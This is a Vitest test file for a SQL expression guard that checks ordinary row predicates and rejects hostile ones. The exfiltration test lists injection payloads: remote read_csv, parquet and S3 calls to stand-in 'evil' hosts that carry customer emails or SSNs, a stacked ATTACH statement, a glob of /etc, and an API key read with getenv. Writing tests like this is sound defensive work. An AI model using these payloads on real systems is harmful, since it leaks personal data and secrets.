import { describe, it, expect } from "vitest";
import { guardExpression, guardColumns, quoteIdent } from "@/lib/hypotheses/guard";

describe("guardExpression", () => {
  it("accepts ordinary row predicates", () => {
    const good = [
      "discount >= 0 AND discount <= 1",
      "l_shipdate >= l_orderdate",
      "amount IS NOT NULL",
      "status IN ('settled', 'pending', 'void')",
      "length(trim(email)) > 0",
      "coalesce(qty, 0) >= 0",
      "regexp_matches(code, '^[A-Z]{3}-[0-9]+$')",
      'CAST("order id" AS BIGINT) > 0',
    ];
    for (const expr of good) {
      expect(guardExpression(expr), expr).toMatchObject({ ok: true });
    }
  });

  it("blocks data exfiltration through table functions", () => {
    const attacks = [
      "read_csv('https://evil.example/?d=' || customer_email) IS NOT NULL",
      "(SELECT count(*) FROM read_parquet('https://evil/x')) > 0",
      "amount > (SELECT max(salary) FROM employees)",
      "parquet_scan('s3://leak/' || ssn) IS NULL",
      "x > 0; ATTACH 'https://evil/db'",
      "x > 0 -- ' OR read_csv('http://evil')",
      "x > 0 /* smuggle */ AND glob('/etc/*') IS NULL",
      "getenv('ANTHROPIC_API_KEY') IS NULL",
    ];
    for (const expr of attacks) {
      expect(guardExpression(expr), expr).toMatchObject({ ok: false });
    }
  });

  it("does not trip over banned words inside string literals", () => {
    // A literal can never execute, so this must be allowed through.
    const r = guardExpression("note = 'please select from the menu'");
    expect(r).toMatchObject({ ok: true });
  });

  it("allows a column legitimately named like a keyword when quoted", () => {
    expect(guardExpression('"from" IS NOT NULL')).toMatchObject({ ok: true });
    expect(guardExpression('"select" > 0')).toMatchObject({ ok: true });
  });

  it("rejects empty, oversized, and unbalanced expressions", () => {
    expect(guardExpression("   ")).toMatchObject({ ok: false });
    expect(guardExpression("x".repeat(1001) + " > 0")).toMatchObject({ ok: false });
    expect(guardExpression("(a > 0")).toMatchObject({ ok: false });
    expect(guardExpression("a > 0)")).toMatchObject({ ok: false });
  });
});

describe("guardColumns", () => {
  it("accepts known columns and rejects unknown ones", () => {
    expect(guardColumns(["a", "b"], ["a", "b", "c"])).toMatchObject({ ok: true });
    expect(guardColumns(["a", "zzz"], ["a", "b"])).toMatchObject({ ok: false });
    expect(guardColumns([], ["a"])).toMatchObject({ ok: false });
  });
});

describe("quoteIdent", () => {
  it("escapes embedded double quotes", () => {
    expect(quoteIdent("plain")).toBe('"plain"');
    expect(quoteIdent('we"ird')).toBe('"we""ird"');
  });
});
